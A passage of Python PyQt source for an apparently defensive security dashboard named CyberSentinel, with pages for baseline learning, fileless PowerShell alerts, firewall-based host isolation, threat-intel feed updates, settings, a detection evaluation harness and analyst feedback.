        stop_btn.clicked.connect(self._stop_baseline)

        stats_btn = QPushButton("📊  Show Stats")
        stats_btn.setMinimumWidth(110)
        stats_btn.clicked.connect(self._show_baseline_stats)

        ctrl_layout.addWidget(dur_label)
        ctrl_layout.addWidget(self._baseline_hours)
        ctrl_layout.addWidget(start_btn)
        ctrl_layout.addWidget(stop_btn)
        ctrl_layout.addWidget(stats_btn)
        ctrl_layout.addStretch()
        inner_layout.addWidget(ctrl_grp)

        self._baseline_console = ConsoleWidget()
        self._baseline_console.append_line("● Use controls above to manage baseline learning.", THEME["muted"])
        inner_layout.addWidget(self._baseline_console, 1)

        layout.addWidget(inner, 1)
        return page

    def _start_baseline(self):
        hours = self._baseline_hours.value()
        self._baseline_console.clear_console()
        self._baseline_console.append_line(f"[*] Starting baseline learning for {hours} hour(s)…", THEME["blue"])

        def _do():
            self.baseline.start_learning(hours)
        worker = GenericWorker(_do)
        worker.line_out.connect(self._baseline_console.append_line)
        worker.finished.connect(lambda _: self._baseline_console.append_line("[+] Learn mode active.", THEME["green"]))
        self._workers.append(worker)
        worker.start()

    def _stop_baseline(self):
        self._baseline_console.append_line("[*] Stopping baseline and saving profiles…", THEME["yellow"])
        def _do():
            self.baseline.stop_learning()
        worker = GenericWorker(_do)
        worker.line_out.connect(self._baseline_console.append_line)
        worker.finished.connect(lambda _: self._baseline_console.append_line("[+] Baseline saved.", THEME["green"]))
        self._workers.append(worker)
        worker.start()

    def _show_baseline_stats(self):
        def _do():
            self.baseline.display_baseline_stats()
        worker = GenericWorker(_do)
        worker.line_out.connect(self._baseline_console.append_line)
        worker.finished.connect(lambda _: None)
        self._workers.append(worker)
        worker.start()

    # ── PAGE: FILELESS ────────────────────────────────────────────────────────

    def _build_fileless_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "👻", "Fileless / AMSI Alerts",
            "PowerShell ScriptBlock obfuscation detection via Windows Event Log 4104"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        btn_row = QHBoxLayout()
        refresh_btn = QPushButton("↻  Refresh Alerts")
        refresh_btn.setObjectName("primary")
        refresh_btn.setMinimumWidth(150)
        refresh_btn.clicked.connect(self._refresh_fileless)
        btn_row.addWidget(refresh_btn)
        btn_row.addStretch()

        req_note = QLabel("Requires: pywin32 + PowerShell ScriptBlock Logging enabled")
        req_note.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px;")
        btn_row.addWidget(req_note)
        inner_layout.addLayout(btn_row)

        grp = QGroupBox("Fileless / AMSI Alert History")
        grp_layout = QVBoxLayout(grp)
        self._fileless_table = make_table(
            ["Timestamp", "Source", "PID", "Findings"],
            wrap_last=True,
        )
        grp_layout.addWidget(self._fileless_table)
        inner_layout.addWidget(grp, 1)

        layout.addWidget(inner, 1)
        return page

    def _refresh_fileless(self):
        rows = _db_query(
            "SELECT source, findings, pid, timestamp FROM fileless_alerts ORDER BY timestamp DESC LIMIT 50"
        )
        t = self._fileless_table
        t.setRowCount(0)
        if not rows:
            row = t.rowCount(); t.insertRow(row)
            t.setItem(row, 0, table_item("No fileless alerts detected yet.", THEME["muted"]))
            for i in range(1, 4):
                t.setItem(row, i, table_item(""))
        else:
            for r in rows:
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(r.get("timestamp", "")))
                t.setItem(row, 1, table_item(r.get("source", "—")))
                t.setItem(row, 2, table_item(r.get("pid", "—")))
                t.setItem(row, 3, table_item(r.get("findings") or "—", THEME["yellow"]))
            t.resizeRowsToContents()

    # ── PAGE: NETWORK ─────────────────────────────────────────────────────────

    def _build_network_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🌐", "Network Containment",
            "Emergency host isolation — adds Windows Firewall block rules"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(16)

        warn = QLabel("⚠️  WARNING: Isolating the network will cut all internet connectivity until restored.")
        warn.setStyleSheet(f"""
            color: {THEME['red']};
            font-size: 12px;
            background: {THEME['red_bg']};
            border: 1px solid {THEME['red']};
            border-radius: 5px;
            padding: 10px 14px;
        """)
        inner_layout.addWidget(warn)

        btn_grp = QGroupBox("Containment Controls")
        btn_layout = QHBoxLayout(btn_grp)
        btn_layout.setSpacing(16)

        isolate_btn = QPushButton("🔒  ISOLATE HOST NETWORK")
        isolate_btn.setObjectName("danger")
        isolate_btn.setMinimumHeight(48)
        isolate_btn.setMinimumWidth(220)
        isolate_btn.clicked.connect(self._isolate_network)

        restore_btn = QPushButton("🔓  RESTORE NETWORK")
        restore_btn.setObjectName("success")
        restore_btn.setMinimumHeight(48)
        restore_btn.setMinimumWidth(180)
        restore_btn.clicked.connect(self._restore_network)

        btn_layout.addWidget(isolate_btn)
        btn_layout.addWidget(restore_btn)
        btn_layout.addStretch()
        inner_layout.addWidget(btn_grp)

        self._net_console = ConsoleWidget()
        self._net_console.append_line("● Network containment ready.", THEME["muted"])
        inner_layout.addWidget(self._net_console, 1)

        layout.addWidget(inner, 1)
        return page

    def _isolate_network(self):
        reply = QMessageBox.warning(
            self, "Confirm Isolation",
            "This will block ALL outbound and inbound traffic immediately.\n\nProceed?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply == QMessageBox.StandardButton.Yes:
            self._net_console.clear_console()
            worker = GenericWorker(self.isolate_net)
            worker.line_out.connect(self._net_console.append_line)
            worker.finished.connect(lambda _: self._net_console.append_line(
                "[!] Host isolated. Restore via Restore Network button.", THEME["red"]
            ))
            self._workers.append(worker)
            worker.start()

    def _restore_network(self):
        self._net_console.clear_console()
        worker = GenericWorker(self.restore_net)
        worker.line_out.connect(self._net_console.append_line)
        worker.finished.connect(lambda _: self._net_console.append_line(
            "[+] Network access restored.", THEME["green"]
        ))
        self._workers.append(worker)
        worker.start()

    # ── PAGE: INTEL ───────────────────────────────────────────────────────────

    def _build_intel_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "📡", "Threat Intel Feed Manager",
            "Download and refresh LOLBAS, LOLDrivers, Feodo, and JA3 blocklists"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        grp = QGroupBox("Feed Status")
        grp_layout = QVBoxLayout(grp)
        self._intel_table = make_table(["Feed", "Cached", "Last Updated", "Size (KB)"])
        self._intel_table.setMaximumHeight(180)
        grp_layout.addWidget(self._intel_table)
        inner_layout.addWidget(grp)

        btn_row = QHBoxLayout()
        check_btn = QPushButton("↻  Check Status")
        check_btn.setMinimumWidth(130)
        check_btn.clicked.connect(self._check_intel_status)
        update_btn = QPushButton("⬇  Update All Feeds")
        update_btn.setObjectName("primary")
        update_btn.setMinimumWidth(160)
        update_btn.clicked.connect(self._run_intel_update)
        btn_row.addWidget(check_btn)
        btn_row.addWidget(update_btn)
        btn_row.addStretch()
        inner_layout.addLayout(btn_row)

        self._intel_progress = QProgressBar()
        self._intel_progress.setRange(0, 0)
        self._intel_progress.setVisible(False)
        self._intel_progress.setFixedHeight(4)
        inner_layout.addWidget(self._intel_progress)

        self._intel_console = ConsoleWidget()
        self._intel_console.append_line("● Click Check Status or Update All Feeds.", THEME["muted"])
        inner_layout.addWidget(self._intel_console, 1)

        layout.addWidget(inner, 1)
        self._check_intel_status()
        return page

    def _check_intel_status(self):
        try:
            status = self.feed_status()
            t = self._intel_table
            t.setRowCount(0)
            for name, info in status.items():
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(name))
                cached = "✓" if info.get("cached") else "✗"
                t.setItem(row, 1, table_item(cached, THEME["green"] if info.get("cached") else THEME["red"]))
                t.setItem(row, 2, table_item(info.get("last_update", "Never")))
                t.setItem(row, 3, table_item(str(info.get("size_kb", 0))))
        except Exception as e:
            self._intel_console.append_line(f"[-] Could not read feed status: {e}", THEME["red"])

    def _run_intel_update(self):
        self._intel_console.clear_console()
        self._intel_console.append_line("[*] Updating all threat intelligence feeds…", THEME["blue"])
        self._intel_progress.setVisible(True)

        worker = GenericWorker(self.update_all, force=True)
        worker.line_out.connect(self._intel_console.append_line)
        worker.finished.connect(self._intel_update_done)
        self._workers.append(worker)
        worker.start()

    def _intel_update_done(self, _):
        self._intel_progress.setVisible(False)
        self._intel_console.append_line("[+] Intel update complete.", THEME["green"])
        self._check_intel_status()

    # ── PAGE: SETTINGS ────────────────────────────────────────────────────────

    def _build_settings_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "⚙️", "Settings",
            "API keys encrypted with Fernet AES-128 · LLM model selection · Webhook configuration"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        from modules import utils as _utils

        # API keys
        api_grp = QGroupBox("Cloud API Keys")
        api_form = QFormLayout(api_grp)
        api_form.setSpacing(10)
        self._api_fields = {}
        for key in ("virustotal", "alienvault", "metadefender", "malwarebazaar"):
            le = QLineEdit()
            le.setEchoMode(QLineEdit.EchoMode.Password)
            current = self.logic.api_keys.get(key, "")
            le.setPlaceholderText("Not configured" if not current else "••••••••••••••••")
            le.setText(current)
            self._api_fields[key] = le
            row_layout = QHBoxLayout()
            row_layout.addWidget(le)
            toggle = QPushButton("Show")
            toggle.setMinimumWidth(48)
            toggle.setFixedHeight(28)
            toggle.setCheckable(True)
            toggle.setStyleSheet(f"""
                QPushButton {{
                    background: {THEME['surface']};
                    color: {THEME['muted']};
                    border: 1px solid {THEME['border']};
                    border-radius: 4px;
                    font-size: 10px;
                    padding: 0;
                }}
                QPushButton:checked {{
                    color: {THEME['blue']};
                    border-color: {THEME['blue']};
                }}
                QPushButton:hover {{
                    color: {THEME['text']};
                }}
            """)
            toggle.toggled.connect(lambda checked, f=le, b=toggle: (
                f.setEchoMode(QLineEdit.EchoMode.Normal if checked else QLineEdit.EchoMode.Password),
                b.setText("Hide" if checked else "Show")
            ))
            row_layout.addWidget(toggle)
            api_form.addRow(QLabel(key.capitalize() + ":"), row_layout)
        inner_layout.addWidget(api_grp)

        # ── LLM Model Selection ───────────────────────────────────────────────
        llm_grp = QGroupBox("Local AI Model (Ollama)")
        llm_layout = QVBoxLayout(llm_grp)
        llm_layout.setSpacing(10)

        # Info label
        llm_info = QLabel(
            "Select the Ollama model used for AI analyst reports.\n"
            "Click 'Scan' to detect models currently installed on your machine."
        )
        llm_info.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px;")
        llm_info.setWordWrap(True)
        llm_layout.addWidget(llm_info)

        # Recommended models with RAM hints
        RECOMMENDED = {
            "deepseek-r1:8b": ("deepseek-r1:8b", "~8 GB RAM", "Best quality reports"),
            "qwen2.5:7b":     ("qwen2.5:7b",     "~4.7 GB RAM", "Good balance"),
            "qwen2.5:3b":     ("qwen2.5:3b",     "~2.0 GB RAM", "Recommended default — fastest"),
        }

        # Combo + scan row
        combo_row = QHBoxLayout()

        self._llm_combo = QComboBox()
        self._llm_combo.setEditable(False)
        self._llm_combo.setMinimumWidth(280)
        # Set explicit font so Qt never falls back to a 0-point font
        # when rendering the dropdown items
        self._llm_combo.setFont(QFont("Arial", 11))
        self._llm_combo.setStyleSheet(f"""
            QComboBox {{
                background: #0d1117;
                color: {THEME['text']};
                border: 1px solid {THEME['border']};
                border-radius: 4px;
                padding: 6px 10px;
                font-family: Arial;
                font-size: 11px;
            }}
            QComboBox:focus {{
                border: 1px solid {THEME['blue']};
            }}
            QComboBox QAbstractItemView {{
                background: #161b22;
                color: {THEME['text']};
                border: 1px solid {THEME['border']};
                selection-background-color: {THEME['blue']};
                font-family: Arial;
                font-size: 11px;
                outline: none;
            }}
        """)

        scan_btn = QPushButton("🔍  Scan Available Models")
        scan_btn.setMinimumWidth(180)
        scan_btn.setToolTip("Runs 'ollama list' to find models installed on this machine")

        self._llm_status_lbl = QLabel("")
        self._llm_status_lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px;")

        combo_row.addWidget(self._llm_combo, 1)
        combo_row.addWidget(scan_btn)
        llm_layout.addLayout(combo_row)
        llm_layout.addWidget(self._llm_status_lbl)

        # RAM hint label — updates when selection changes
        self._llm_hint_lbl = QLabel("")
        self._llm_hint_lbl.setStyleSheet(
            f"color: {THEME['green']}; font-size: 10px; font-style: italic;"
        )
        llm_layout.addWidget(self._llm_hint_lbl)

        inner_layout.addWidget(llm_grp)

        def _populate_combo(models: list, status: str):
            """Fills the combo box, marking recommended models with hints."""
            self._llm_combo.clear()
            current = getattr(self.logic, "llm_model", "qwen2.5:3b") or "qwen2.5:3b"
            found_current = False

            # Add installed models first
            for m in models:
                rec = RECOMMENDED.get(m)
                if rec:
                    label = f"[*] {m}  ({rec[1]}) — {rec[2]}"
                else:
                    label = f"    {m}"
                self._llm_combo.addItem(label, userData=m)
                if m == current:
                    self._llm_combo.setCurrentIndex(self._llm_combo.count() - 1)
                    found_current = True

            # If current model not in installed list, add it as a fallback entry
            if not found_current:
                label = f"    {current}  (currently configured)"
                self._llm_combo.addItem(label, userData=current)
                self._llm_combo.setCurrentIndex(self._llm_combo.count() - 1)

            self._llm_status_lbl.setText(status)
            _update_hint()

        def _update_hint():
            """Shows RAM/quality hint for the currently selected model."""
            data = self._llm_combo.currentData()
            rec  = RECOMMENDED.get(data or "")
            if rec:
                self._llm_hint_lbl.setText(
                    f"[*] {rec[0]}  |  RAM: {rec[1]}  |  {rec[2]}"
                )
            else:
                self._llm_hint_lbl.setText(
                    "ℹ  Custom model selected — ensure it is pulled and Ollama is running."
                )
                self._llm_hint_lbl.setStyleSheet(
                    f"color: {THEME['muted']}; font-size: 10px; font-style: italic;"
                )

        self._llm_combo.currentIndexChanged.connect(_update_hint)

        def _scan_models():
            scan_btn.setEnabled(False)
            self._llm_status_lbl.setText("Scanning installed models…")
            from modules import utils as _utils

            def _do():
                return _utils.ollama_list_models()

            worker = GenericWorker(_do)

            def _done(models):
                scan_btn.setEnabled(True)
                if models:
                    _populate_combo(
                        models,
                        f"Found {len(models)} installed model(s). "
                        f"✓ = CyberSentinel recommended."
                    )
                    self._llm_status_lbl.setStyleSheet(
                        f"color: {THEME['green']}; font-size: 10px;"
                    )
                else:
                    # Ollama not running or no models — show recommended list manually
                    self._llm_status_lbl.setText(
                        "⚠ Ollama not detected or no models installed. "
                        "Showing recommended models — install via 'ollama pull <model>'."
                    )
                    self._llm_status_lbl.setStyleSheet(
                        f"color: {THEME['yellow']}; font-size: 10px;"
                    )
                    _populate_combo(list(RECOMMENDED.keys()), "")

            worker.finished.connect(_done)
            self._workers.append(worker)
            worker.start()

        scan_btn.clicked.connect(_scan_models)

        # Auto-populate on page load with current model pre-selected
        _populate_combo(
            list(RECOMMENDED.keys()),
            "Click 'Scan Available Models' to detect installed models."
        )

        # Webhook
        wh_grp = QGroupBox("SOC Webhook")
        wh_layout = QHBoxLayout(wh_grp)
        self._webhook_field = QLineEdit()
        self._webhook_field.setPlaceholderText("https://discord.com/api/webhooks/… or Slack/Teams URL")
        self._webhook_field.setText(self.logic.webhook_url or "")
        test_wh_btn = QPushButton("🔔  Test")
        test_wh_btn.setMinimumWidth(80)
        test_wh_btn.clicked.connect(self._test_webhook)
        wh_layout.addWidget(self._webhook_field)
        wh_layout.addWidget(test_wh_btn)
        inner_layout.addWidget(wh_grp)

        # Save
        save_btn = QPushButton("💾  Save Configuration")
        save_btn.setObjectName("primary")
        save_btn.setMinimumWidth(180)
        save_btn.clicked.connect(self._save_settings)
        inner_layout.addWidget(save_btn)

        self._settings_status = QLabel("")
        self._settings_status.setStyleSheet(f"font-size: 11px; color: {THEME['green']};")
        inner_layout.addWidget(self._settings_status)
        inner_layout.addStretch()

        layout.addWidget(inner, 1)
        return page

    def _save_settings(self):
        from modules import utils as _utils
        for key, le in self._api_fields.items():
            val = le.text().strip()
            if val:
                self.logic.api_keys[key] = val
            else:
                self.logic.api_keys.pop(key, None)
        self.logic.webhook_url = self._webhook_field.text().strip()
        # Persist selected LLM model
        selected_model = self._llm_combo.currentData() or self._llm_combo.currentText().strip()
        if selected_model:
            self.logic.llm_model = selected_model
        _utils.save_config(
            self.logic.api_keys,
            self.logic.webhook_url,
            self.logic.llm_model,
        )
        self._settings_status.setText(
            f"[+] Configuration saved — LLM: {self.logic.llm_model}"
        )

    def _test_webhook(self):
        from modules import utils as _utils
        url = self._webhook_field.text().strip()
        if not url:
            QMessageBox.warning(self, "No URL", "Please enter a webhook URL first.")
            return
        ok = _utils.send_webhook_alert(url, "🔔 CyberSentinel Webhook Test", {
            "Status": "This is a test alert from CyberSentinel GUI",
            "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })
        if ok:
            QMessageBox.information(self, "Success", "✅ Webhook test sent successfully!")
        else:
            QMessageBox.warning(self, "Failed", "❌ Webhook test failed — check the URL and your internet connection.")


    # ── PAGE: EVALUATION ─────────────────────────────────────────────────────

    def _build_evaluation_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "📈", "Quantitative Evaluation Harness",
            "Benchmark Tier 2 ML against labelled datasets — §3.2.1 methodology"
        ))

        inner = QWidget()
        il = QVBoxLayout(inner)
        il.setContentsMargins(24, 20, 24, 20)
        il.setSpacing(12)

        # ── Dataset paths ─────────────────────────────────────────────────
        ds_grp = QGroupBox("Dataset Configuration")
        ds_form = QFormLayout(ds_grp)
        ds_form.setSpacing(8)

        # Samples root (temporal layout)
        samples_row = QHBoxLayout()
        self._eval_samples = QLineEdit()
        self._eval_samples.setPlaceholderText(
            "samples/ root (with pre2020/post2020/stealth subdirs) — leave blank for flat layout"
        )
        samples_browse = QPushButton("📁")
        samples_browse.setMinimumWidth(36)
        samples_browse.clicked.connect(lambda: self._eval_browse(self._eval_samples))
        samples_row.addWidget(self._eval_samples)
        samples_row.addWidget(samples_browse)
        ds_form.addRow(QLabel("Samples Root:"), samples_row)

        # Flat layout fallback
        mal_row = QHBoxLayout()
        self._eval_malware = QLineEdit()
        self._eval_malware.setPlaceholderText("Flat layout — malware directory")
        mal_browse = QPushButton("📁")
        mal_browse.setMinimumWidth(36)
        mal_browse.clicked.connect(lambda: self._eval_browse(self._eval_malware))
        mal_row.addWidget(self._eval_malware)
        mal_row.addWidget(mal_browse)
        ds_form.addRow(QLabel("Malware Dir:"), mal_row)

        clean_row = QHBoxLayout()
        self._eval_clean = QLineEdit()
        self._eval_clean.setPlaceholderText("Flat layout — clean/benign directory")
        clean_browse = QPushButton("📁")
        clean_browse.setMinimumWidth(36)
        clean_browse.clicked.connect(lambda: self._eval_browse(self._eval_clean))
        clean_row.addWidget(self._eval_clean)
        clean_row.addWidget(clean_browse)
        ds_form.addRow(QLabel("Clean Dir:"), clean_row)
        il.addWidget(ds_grp)

        # ── Options row ───────────────────────────────────────────────────
        opts_row = QHBoxLayout()
        self._eval_tier1_chk = QPushButton("☁  Include Tier 1 Cloud")
        self._eval_tier1_chk.setCheckable(True)
        self._eval_tier1_chk.setMinimumWidth(180)
        self._eval_resume_chk = QPushButton("↺  Resume Mode")
        self._eval_resume_chk.setCheckable(True)
        self._eval_resume_chk.setMinimumWidth(130)
        self._eval_metrics_btn = QPushButton("📊  Metrics Only (no rescan)")
        self._eval_metrics_btn.setMinimumWidth(210)
        self._eval_metrics_btn.clicked.connect(self._run_metrics_only)
        opts_row.addWidget(self._eval_tier1_chk)
        opts_row.addWidget(self._eval_resume_chk)
        opts_row.addWidget(self._eval_metrics_btn)
        opts_row.addStretch()

        self._eval_run_btn = QPushButton("▶  Run Evaluation")
        self._eval_run_btn.setObjectName("primary")
        self._eval_run_btn.setMinimumWidth(160)
        self._eval_run_btn.clicked.connect(self._run_evaluation)
        opts_row.addWidget(self._eval_run_btn)
        il.addLayout(opts_row)

        # ── Progress ──────────────────────────────────────────────────────
        self._eval_progress = QProgressBar()
        self._eval_progress.setRange(0, 0)
        self._eval_progress.setVisible(False)
        self._eval_progress.setFixedHeight(4)
        il.addWidget(self._eval_progress)

        # ── Metrics summary cards ─────────────────────────────────────────
        cards_row = QHBoxLayout()
        cards_row.setSpacing(10)
        self._eval_cards = {}
        for label, key, color in [
            ("Precision",  "precision",  THEME["blue"]),
            ("Recall",     "recall",     THEME["green"]),
            ("F1 Score",   "f1_score",   THEME["blue"]),
            ("FPR",        "fpr",        THEME["red"]),
            ("FNR",        "fnr",        THEME["yellow"]),
            ("Accuracy",   "accuracy",   THEME["green"]),
        ]:
            card = StatCard(label, color)
            self._eval_cards[key] = card
            cards_row.addWidget(card)
        il.addLayout(cards_row)

        # ── Threshold sweep table ─────────────────────────────────────────
        sweep_grp = QGroupBox("Threshold Sweep  (θ = 0.40 → 0.80)")
        sweep_layout = QVBoxLayout(sweep_grp)
        self._eval_sweep_table = make_table(
            ["θ", "Precision", "Recall", "F1", "FPR", "FNR", "Accuracy",
             "TP", "FP", "TN", "FN"],
            stretch_col=3
        )
        self._eval_sweep_table.setMaximumHeight(240)
        sweep_layout.addWidget(self._eval_sweep_table)
        il.addWidget(sweep_grp)

        # ── Console ───────────────────────────────────────────────────────
        self._eval_console = ConsoleWidget()
        self._eval_console.setMaximumHeight(200)
        self._eval_console.append_line(
            "● Configure dataset paths and click Run Evaluation.", THEME["muted"]
        )
        il.addWidget(self._eval_console)

        layout.addWidget(inner, 1)
        return page

    def _eval_browse(self, line_edit: QLineEdit):
        path = QFileDialog.getExistingDirectory(self, "Select Directory")
        if path:
            line_edit.setText(path)

    def _run_evaluation(self):
        import types
        args = types.SimpleNamespace(
            samples  = self._eval_samples.text().strip() or None,
            malware  = self._eval_malware.text().strip() or None,
            clean    = self._eval_clean.text().strip() or None,
            tier1    = self._eval_tier1_chk.isChecked(),
            resume   = self._eval_resume_chk.isChecked(),
        )
        if not args.samples and not args.malware:
            QMessageBox.warning(self, "No Dataset",
                "Please set a Samples Root or Malware/Clean directory.")
            return
        if args.malware and not args.clean:
            QMessageBox.warning(self, "Missing Clean Dir",
                "Please also specify a Clean directory for the flat layout.")
            return

        self._eval_console.clear_console()
        self._eval_console.append_line("[*] Starting evaluation...", THEME["blue"])
        self._eval_progress.setVisible(True)
        self._eval_run_btn.setEnabled(False)
        self._eval_metrics_btn.setEnabled(False)

        from eval_harness import run_evaluation
        worker = GenericWorker(run_evaluation, args)
        worker.line_out.connect(self._eval_console.append_line)
        worker.finished.connect(self._eval_done)
        self._workers.append(worker)
        worker.start()

    def _run_metrics_only(self):
        self._eval_console.clear_console()
        self._eval_console.append_line("[*] Loading predictions from v2_predictions.db...", THEME["blue"])
        self._eval_progress.setVisible(True)
        self._eval_run_btn.setEnabled(False)
        self._eval_metrics_btn.setEnabled(False)

        def _do():
            import types
            from eval_harness import init_pred_db, load_predictions, sweep_thresholds
            from eval_harness import compute_confusion, best_threshold, DEFAULT_θ, save_reports
            import datetime
            init_pred_db()
            preds = load_predictions()
            if not preds:
                print("[-] No predictions in v2_predictions.db. Run a full evaluation first.")
                return None
            print(f"[*] Loaded {len(preds)} predictions.")
            sweep   = sweep_thresholds(preds)
            default = compute_confusion(preds, DEFAULT_θ)
            best    = best_threshold(sweep, "f1_score")
            report = {
                "generated": datetime.datetime.now().isoformat(),
                "combined": {
                    "total_samples": len(preds),
                    "metrics_at_default_theta": {k: v for k, v in default.items()
                                                 if k not in ("fp_files","fn_files")},
                    "best_threshold": {k: v for k, v in best.items()
                                       if k not in ("fp_files","fn_files")},
                    "threshold_sweep": [{k: v for k, v in r.items()
                                         if k not in ("fp_files","fn_files")}
                                        for r in sweep],
                }
            }
            save_reports(report)
            return report

        worker = GenericWorker(_do)
        worker.line_out.connect(self._eval_console.append_line)
        worker.finished.connect(self._eval_done)
        self._workers.append(worker)
        worker.start()

    def _eval_done(self, report):
        self._eval_progress.setVisible(False)
        self._eval_run_btn.setEnabled(True)
        self._eval_metrics_btn.setEnabled(True)
        if not report:
            self._eval_console.append_line("[-] Evaluation failed or no data.", THEME["red"])
            return

        # Pull combined metrics (or first stratum)
        m = (report.get("combined", {}).get("metrics_at_default_theta")
             or next(iter(report.get("strata", {}).values()), {})
                    .get("metrics_at_default_theta", {}))
        if not m:
            self._eval_console.append_line("[+] Evaluation complete. No combined metrics.", THEME["green"])
            return

        for key, card in self._eval_cards.items():
            val = m.get(key, 0)
            card.set_value(f"{val:.2%}" if key not in ("f1_score",) else f"{val:.4f}")

        # Fill threshold sweep table
        sweep_rows = (
            report.get("combined", {}).get("threshold_sweep")
            or next(iter(report.get("strata", {}).values()), {}).get("threshold_sweep", [])
        )
        t = self._eval_sweep_table
        t.setRowCount(0)
        from eval_harness import DEFAULT_θ
        for r in (sweep_rows or []):
            row = t.rowCount()
            t.insertRow(row)
            is_default = abs(r.get("threshold", 0) - DEFAULT_θ) < 0.001
            color = THEME["blue"] if is_default else THEME["text"]
            t.setItem(row, 0,  table_item(f"{r.get('threshold',0):.2f}", color))
            t.setItem(row, 1,  table_item(f"{r.get('precision',0):.2%}"))
            t.setItem(row, 2,  table_item(f"{r.get('recall',0):.2%}"))
            t.setItem(row, 3,  table_item(f"{r.get('f1_score',0):.4f}",
                                          THEME["green"] if r.get("f1_score",0) > 0.85 else THEME["text"]))
            t.setItem(row, 4,  table_item(f"{r.get('fpr',0):.2%}",
                                          THEME["red"] if r.get("fpr",0) > 0.1 else THEME["text"]))
            t.setItem(row, 5,  table_item(f"{r.get('fnr',0):.2%}",
                                          THEME["yellow"] if r.get("fnr",0) > 0.1 else THEME["text"]))
            t.setItem(row, 6,  table_item(f"{r.get('accuracy',0):.2%}"))
            t.setItem(row, 7,  table_item(str(r.get("TP", 0)), THEME["green"]))
            t.setItem(row, 8,  table_item(str(r.get("FP", 0)), THEME["red"]))
            t.setItem(row, 9,  table_item(str(r.get("TN", 0))))
            t.setItem(row, 10, table_item(str(r.get("FN", 0)), THEME["yellow"]))

        self._eval_console.append_line(
            f"[+] Evaluation complete. Reports saved to eval_report.json / .txt", THEME["green"]
        )


    # ── STATUS BAR ────────────────────────────────────────────────────────────

    def _set_status(self, text: str, color: str = None):
        self._status_bar.setText(text)
        c = color or THEME["green"]
        self._status_bar.setStyleSheet(f"""
            color: {c}; font-size: 10px;
            padding: 8px 14px;
            border-top: 1px solid {THEME['border']};
            background: transparent;
        """)


    # ── PAGE: ANALYST FEEDBACK ────────────────────────────────────────────────

    def _build_feedback_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "\U0001f4dd", "Analyst Feedback",
            "Review scan verdicts, mark False Positives, and submit manual corrections"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(14)

        # ── Stats row ─────────────────────────────────────────────────────────
        self._fb_stat_cards = {}
        stats_row = QHBoxLayout()
        stats_row.setSpacing(12)
        for label, key, color in [
            ("Total Reviews",   "total",    THEME["blue"]),
            ("Confirmed TPs",   "confirmed",THEME["red"]),
            ("False Positives", "fp",       THEME["yellow"]),
            ("FP Rate",         "fpr",      THEME["muted"]),
        ]:
            card = StatCard(label, color)
            self._fb_stat_cards[key] = card
            stats_row.addWidget(card)
        inner_layout.addLayout(stats_row)

        # ── Manual feedback submission ─────────────────────────────────────
        submit_grp = QGroupBox("Submit Manual Feedback")
        submit_form = QVBoxLayout(submit_grp)

        row1 = QHBoxLayout()
        self._fb_sha_input = QLineEdit()
        self._fb_sha_input.setPlaceholderText("SHA-256 hash (64 chars) or MD5/SHA-1...")
        self._fb_fname_input = QLineEdit()
        self._fb_fname_input.setPlaceholderText("Filename (optional)...")
        row1.addWidget(QLabel("Hash:"))
        row1.addWidget(self._fb_sha_input, 2)
        row1.addWidget(QLabel("  File:"))
        row1.addWidget(self._fb_fname_input, 1)
        submit_form.addLayout(row1)

        row2 = QHBoxLayout()
        self._fb_verdict_combo = QComboBox()
        self._fb_verdict_combo.addItems([
            "MALICIOUS", "CRITICAL RISK", "SUSPICIOUS", "SAFE", "UNKNOWN"
        ])
        self._fb_analyst_combo = QComboBox()
        self._fb_analyst_combo.addItems([
            "CONFIRMED", "FALSE_POSITIVE", "FALSE_NEGATIVE"
        ])
        self._fb_analyst_combo.currentTextChanged.connect(self._on_analyst_verdict_change)
        row2.addWidget(QLabel("System Verdict:"))
        row2.addWidget(self._fb_verdict_combo)
        row2.addWidget(QLabel("  Analyst Decision:"))
        row2.addWidget(self._fb_analyst_combo)
        row2.addStretch()
        submit_form.addLayout(row2)

        row3 = QHBoxLayout()
        self._fb_notes_input = QLineEdit()
        self._fb_notes_input.setPlaceholderText("Reason / notes (required for FP/FN)...")
        self._fb_submit_btn = QPushButton("\u2714  Submit Feedback")
        self._fb_submit_btn.setObjectName("primary")
        self._fb_submit_btn.setMinimumWidth(160)
        self._fb_submit_btn.clicked.connect(self._submit_feedback)
        row3.addWidget(QLabel("Notes:"))
        row3.addWidget(self._fb_notes_input, 1)
        row3.addWidget(self._fb_submit_btn)
        submit_form.addLayout(row3)

        # Auto-fill hint
        hint = QLabel(
